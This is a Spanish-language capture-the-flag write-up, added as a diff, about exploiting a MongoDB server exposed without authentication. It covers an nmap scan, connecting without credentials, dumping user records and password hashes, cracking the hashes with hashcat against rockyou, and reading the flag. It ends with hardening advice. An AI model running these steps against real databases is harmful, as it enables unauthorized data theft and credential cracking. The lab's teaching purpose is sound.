@@ -1,0 +1,126 @@
+Este laboratorio está orientado a la enumeración y explotación de una base de datos MongoDB expuesta sin autenticación, 
+un escenario realista y común en entornos mal configurados.
+
+
+Enumeración inicial:
+
+Escaneo de puertos con Nmap
+
+nmap -p- --min-rate 5000 -sS -n -Pn 10.129.25.182
+
+* **22/tcp** → SSH
+* **27017/tcp** → MongoDB
+
+Se identifican **2 puertos TCP abiertos**, siendo el más interesante el **27017**, correspondiente al servicio MongoDB.
+
+Enumeración del servicio MongoDB
+
+Conexión al servicio:
+
+Los clientes modernos de MongoDB (`mongosh`) generan incompatibilidades con versiones antiguas del servidor. 
+Para evitar este problema se utilizó una versión legacy del cliente.
+
+mongo 10.129.25.182:27017
+
+La conexión fue exitosa **sin necesidad de credenciales**, lo que confirma que:
+El control de acceso **no está habilitado**
+El servidor permite **lectura y escritura sin autenticación**
+
+MongoDB Server Version detectada:
+
+3.6.8
+
+Enumeración de bases de datos:
+
+js
+show dbs
+Bases de datos encontradas:
+
+* admin
+* config
+* local
+* users
+* sensitive_information
+
+La presencia de **users** y **sensitive_information** indica posible información crítica.
+
+Análisis de la base de datos `users`
+
+js
+use users
+show collections
+
+Colección encontrada:
+
+* ecommerceWebapp
+
+Extracción de documentos
+
+js
+db.ecommerceWebapp.find().pretty()
+
+Se obtienen múltiples documentos que contienen:
+
+* Nombres de usuario
+* Emails
+* Fechas de creación
+* **Hashes de contraseñas (MD5 / SHA1)**
+
+Esto simula una fuga de información típica de una aplicación web mal protegida.
+
+Análisis de hashes:
+
+Se exportaron los hashes a un archivo local (`md5.txt`) para intentar su crackeo mediante diccionario.
+
+hashcat -m 0 md5.txt /usr/share/wordlists/rockyou.txt --force
+
+
+En este caso, los hashes no fueron crackeados con `rockyou.txt`, pero el objetivo principal del laboratorio era la **exposición de datos**, no la escalada por credenciales.
+
+Obtención de la flag
+
+Enumeración de `sensitive_information`
+js
+use sensitive_information
+show collections
+Colección encontrada:
+
+* flag
+Extracción del contenido
+
+js
+db.flag.find().pretty()
+
+Resultado:
+
+"flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
+
+Esta corresponde a la **flag final de la máquina**, confirmando la explotación exitosa.
+
+Conclusiones:
+
+Este laboratorio demuestra cómo una **mala configuración de MongoDB** puede derivar en una **exposición total de datos sensibles**, 
+incluso sin necesidad de explotar vulnerabilidades complejas.
+
+Conceptos reforzados:
+
+* Enumeración de servicios
+* Bases de datos **NoSQL / MongoDB**
+* Acceso sin autenticación
+* Enumeración de bases de datos y colecciones
+* Extracción de información sensible
+
+Lección clave:
+
+Un servicio crítico expuesto sin autenticación equivale a una brecha de seguridad inmediata.
+
+Recomendaciones de seguridad:
+
+* Habilitar autenticación en MongoDB
+* Restringir acceso por IP
+* No exponer MongoDB directamente a Internet
+* Aplicar hardening y principio de mínimo privilegio
+
+
+
+
